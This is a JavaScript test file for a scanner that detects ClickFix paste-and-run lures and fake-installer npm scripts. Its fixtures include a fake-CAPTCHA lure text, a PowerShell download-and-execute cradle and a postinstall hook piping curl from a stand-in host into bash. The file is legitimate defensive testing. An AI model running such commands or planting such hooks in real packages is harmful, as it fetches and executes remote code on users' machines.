/**
 * Ship Safe — ClickFixAgent
 * ==========================
 *
 * Verifies cross-platform ClickFix lure detection, fake-installer npm scripts,
 * and false-positive guards.
 *
 * Run: npm test
 */

import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'fs';
import path from 'path';
import os from 'os';

import { ClickFixAgent } from '../agents/clickfix-agent.js';

function tmp() { return fs.mkdtempSync(path.join(os.tmpdir(), 'shipsafe-clickfix-')); }
function cleanup(dir) { try { fs.rmSync(dir, { recursive: true, force: true }); } catch { /* */ } }

async function scanText(content, ext) {
  const dir = tmp();
  const file = path.join(dir, `x${ext}`);
  try {
    fs.writeFileSync(file, content);
    return await new ClickFixAgent().analyze({ rootPath: dir, files: [file], recon: {}, options: {} });
  } finally { cleanup(dir); }
}

describe('ClickFixAgent — lures', () => {
  it('flags a fake-error paste-and-run lure (Ctrl+C/Ctrl+V)', async () => {
    const lure = 'Error 501\nSomething went wrong.\nTo fix this, copy the text and paste it into the command bar.\n(Ctrl+C -> Shift+F5 -> Ctrl+V -> Enter)';
    const f = await scanText(lure, '.txt');
    assert.ok(f.some((x) => x.rule === 'CLICKFIX_PASTE_RUN' && x.severity === 'high'));
  });

  it('flags a fake-CAPTCHA Win+R lure and raises confidence with a PS cradle', async () => {
    const lure = 'Verify you are human.\nTo continue: press Win+R, then Ctrl+V, then Enter.\npowershell iwr https://evil/x | iex';
    const f = await scanText(lure, '.html');
    const hit = f.find((x) => x.rule === 'CLICKFIX_PASTE_RUN');
    assert.ok(hit);
    assert.equal(hit.confidence, 'high');
  });

  it('does not flag an ordinary error message', async () => {
    const f = await scanText('Error 500: internal server error. Check the logs and retry.', '.txt');
    assert.equal(f.length, 0);
  });

  it('does not flag docs that mention Ctrl+C without a lure framing', async () => {
    const f = await scanText('Press Ctrl+C to copy the command, then Ctrl+V to paste it into your editor.', '.md');
    assert.equal(f.length, 0);
  });
});

describe('ClickFixAgent — fake installers', () => {
  it('flags a postinstall that pipes a remote fetch into a shell', async () => {
    const dir = tmp();
    try {
      fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({
        name: 'x', scripts: { postinstall: 'curl -s https://evil.sh | bash' },
      }));
      const f = await new ClickFixAgent().analyze({ rootPath: dir, files: [], recon: {}, options: {} });
      assert.ok(f.some((x) => x.rule === 'CLICKFIX_FAKE_INSTALLER' && x.severity === 'high'));
    } finally { cleanup(dir); }
  });

  it('does not flag a normal build postinstall', async () => {
    const dir = tmp();
    try {
      fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({
        name: 'x', scripts: { postinstall: 'node ./scripts/build.js' },
      }));
      const f = await new ClickFixAgent().analyze({ rootPath: dir, files: [], recon: {}, options: {} });
      assert.equal(f.filter((x) => x.rule === 'CLICKFIX_FAKE_INSTALLER').length, 0);
    } finally { cleanup(dir); }
  });
});
